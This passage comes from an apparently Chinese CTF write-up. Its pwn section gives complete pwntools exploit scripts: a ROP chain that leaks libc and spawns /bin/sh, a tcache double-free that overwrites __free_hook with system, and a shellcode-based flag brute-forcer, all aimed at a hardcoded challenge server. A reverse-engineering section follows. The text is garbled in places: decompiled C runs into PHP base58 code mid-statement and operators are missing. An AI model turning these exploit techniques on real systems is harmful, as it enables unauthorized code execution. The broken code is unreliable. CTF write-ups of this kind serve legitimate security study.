        #start 5879938 0x4006E0
        #call vul 5880867 0x400977
        #vul 5880653 0x4008DE
        #read 5879781 0x400670
        #pop_rsi_r15_ret 5881038 0x4009f1
        #read_got 8822014 0x601030
        #binsh 8822106 0x601071
        sh.recv()
        sh.sendline("-1.9999")
        for i in range(0,13):
            inputFloat("111")
        inputFloat("13")
        inputFloat("13")
        inputFloat("0." + "0" * 43 + "23")#0x11
        inputFloat("0." + "0" * 43 + "23")#fake
        #rip = 0x4009f3
        #pop_rdi_ret
        inputRop(5881041)
        #__libc_start_main got
        inputRop(8822026)
        #puts_plt
        inputRop(5879714)
        #pop_rdi_ret
        inputRop(5881041)
        inputRop(0)
        #pop_rsi_r15_ret
        inputRop(5881038)
        inputRop(8822106)
        inputRop(0)
        #read_plt
        inputRop(5879781)
        #pop_rdi_ret
        inputRop(5881041)
        inputRop(0)
        #pop_rsi_r15_ret
        inputRop(5881038)
        inputRop(8822014)
        inputRop(0)
        #read_plt
        inputRop(5879781)
        #pop_rdi_ret
        inputRop(5881041)
        inputRop(8822106)
        #read_plt
        inputRop(5879781)
        #input()
        sh.recvuntil("plz input your float:")
        sh.sendline("0")
        sh.recvuntil("do you want to continue?(y/n)")
        sh.send("n")
        __libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
        libc = __libc_start_main - lib.symbols['__libc_start_main']
        system = libc + lib.symbols['system']
        binsh = libc + lib.search("/bin/sh\x00").next()
        sh.sendline("/bin/sh\x00")
        sleep(0.2)
        sh.sendline(p64(system))
        log.success("__libc_start_main: " + hex(__libc_start_main))
        log.success("system: " + hex(system))
        log.success("binsh: " + hex(binsh))
        log.success("libc: " + hex(libc))
        sh.interactive()
    if __name__ == "__main__":
        pwn("47.110.227.208",10002,0)
### Babytcache
checksec 可以看到程序没有开PIE,同时bss中存放了_IO_2_1_stdout_的地址,并且libc2.27有double
free,所以思路就很明确了.有了double free就可以malloc 2 everywhere,所以这样一的难点在于如何leak
libc,通过double free,可以让fd指向_IO_2_1 _stdout_ ,从而malloc 2 _IO_2_1 _stdout_
,从而修改write_base来leak libc,之后再double free去修改free_hook为system,去free一个/bin/sh就可以了
    from pwn import *
    libc=ELF('./libc.so')
    sh=remote("47.110.227.208",10006)
    def add(size,content):
        sh.sendline('1')
        sh.recvuntil('input your size:')
        sh.sendline(str(size))
        sh.recvuntil('input your message:')
        sh.send(content)
        sh.recvuntil('Done!\n')
    def add2(size,content):
        sh.sendline('1')
        sh.recvuntil('input your size:')
        sh.sendline(str(size))
        sh.recvuntil('input your message:')
        sh.send(content)
        #sh.recvuntil('Done!\n')
    def delete(index):
        sh.sendline('2')
        sh.recvuntil('input the index: ')
        sh.sendline(str(index))
    def main():
        add(0x100,'a\n')
        add(0x100,'a\n')
        add(0x100,'a\n')
        delete(0)
        delete(0)
        add(0x100,p64(0x0000000000602020)+'\n')
        add(0x100,p64(0x0000000000602020)+'\n')
        add(0x100,'\n')
        add2(0x100,p64(0xfbad1880)+p64(0x0)*3+'\x20\n')
        libc_base=u64(sh.recv(6)+'\x00\x00')-0x3eb780
        print "libc_base -> " + hex(libc_base)
        free_hook=libc_base+libc.symbols['__free_hook']
        system=libc_base+libc.symbols['system']
        sh.recvuntil('Done!\n')
        add(0x10,'/bin/sh\x00\n') # index 7
        add(0x20,'\n') # index 8
        delete(8)
        delete(8)
        add(0x20,p64(free_hook)+'\n')
        add(0x20,p64(free_hook)+'\n')
        add(0x20,p64(system)+'\n')
        delete(7)
        sh.interactive()
    if __name__ == '__main__':
        main()
### codepwn
通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call
shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push
r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了
    from pwn import * 
    context.log_level='CRITICAL' 
    def flag_index(index): 
        sh.sendline(str(index)) 
    def code(code): 
        sh.send(code) 
    def name(size,content): 
        sh.recvuntil('tell me your name size:\n') 
        sh.sendline(str(size)) 
        sh.recvuntil('input your name:\n') 
        sh.sendline(content) 
    flag=open('./pwn4_flag','a+') 
    try: 
        for index in range(32): 
            for i in range(0x1,0x7f): 
                sh=remote('47.110.227.208',10004) 
                #sh=process('./pwn4') 
                sh.recvuntil('this is my gift for you, take it!\n') 
                flag_index(index) 
                sh.recvuntil('input your code:\n') 
                code('AQX\xC3') 
                padding='a'.ljust(i,'a') 
                name(0x100,padding) 
                sh.recvuntil('Hello are you ready? '+padding+'\n') 
                sh.sendline() 
                info = sh.recv() 
                if((info).find('bye!') != -1): 
                    print  chr(i+0x16) 
                    flag.write(chr(i+0x16)) 
                    sh.close() 
                    break 
                else: 
                    sh.close() 
    except KeyboardInterrupt: 
        flag.close() 
        exit(0) 
    except: 
        flag.close() 
        sh.close()
## RE
### Secret
（emmm这一题偷懒了），  
首先分析主函数  
里面有两个check函数。进入checktime（）函数，关键代码是这里，
    *(&v5 + i) = rand();
      if ( 14766 * v11 + 18242 * v10 + 4657 * v9 + 22453 * v8 + 7236 * v7 + 28554 * v6 + 25606 * v5 + 12289 * v12 == 12977737
        && 27429 * v11 + 8015 * v10 + 16511 * v9 + 17180 * v8 + 27141 * v7 + 31813 * v6 + 7412 * v5 + 18249 * v12 == 15081473
        && 2846 * v11 + 28353 * v10 + 19864 * v9 + 27377 * v8 + 9006 * v7 + 13657 * v6 + 19099 * v5 + 25835 * v12 == 13554960
        && 1078 * v11 + 5007 * v10 + 6568 * v9 + 23034 * v8 + 10150 * v7 + 22949 * v6 + 32646 * v5 + 15255 * v12 == 11284005
        && 8010 * v11 + 15430 * v10 + 6657 * v9 + 1009 * v8 + 25691 * v7 + 15960 * v6 + 19493 * v5 + 29491 * v12 == 10759932
        && 4605 * v11 + 14468 * v10 + 5017 * v9 + 12805 * v8 + 22973 * v7 + 30584 * v6 + 12620 * v5 + 32085 * v12 == 12085266
        && 7478 * v11 + 6524 * v10 + 25994 * v9 + 16215 * v8 + 12864 * v7 + 20574 * v6 + 8882 * v5 + 14794 * v12 == 11323393
        && 15263 * v11 + 8821 * v10 + 25489 * v9 + 9598 * v8 + 26847 * v7 + 5175 * v6 + 6515 * v5 + 27411 * v12 == 11677607 )
      {
一共8位字符，猜测前5位为flag{然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）  
得到 flag{Th3  
然后来到关键的check函数，看到这里，
    while ( 1 )
      {
        for ( j = 0; !v12[j]; ++j )
          ;
        if ( j >= v11 )
          break;
        v9 = 0;
        while ( j = $base) {
            $div = bcdiv($decimal, $base, 0);
            $mod = bcmod($decimal, $base);
            $output .= $alphabet[$mod];
            $decimal = $div;
        }
        if ($decimal > 0) {
            $output .= $alphabet[$decimal];
        }
        $output = strrev($output);
        return (string) $output;
    }
    function base58_decode($base58)
    {
        $alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        $base = strlen($alphabet);
        if (is_string($base58) === false || !strlen($base58)) {
            return false;
        }
        $indexes = array_flip(str_split($alphabet));
        $chars = str_split($base58);
        foreach ($chars as $char) {
            if (isset($indexes[$char]) === false) {
                return false;
            }
        }
        $decimal = $indexes[$chars[0]];
        for ($i = 1, $l = count($chars); $i  0) {
            $byte = bcmod($decimal, 256);
            $output = pack('C', $byte).$output;
            $decimal = bcdiv($decimal, 256, 0);
        }
        return $output;
    }
解码得到  
sEcondBe5tTime1s_n0w}  
flag到手  
后来发现，拿这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。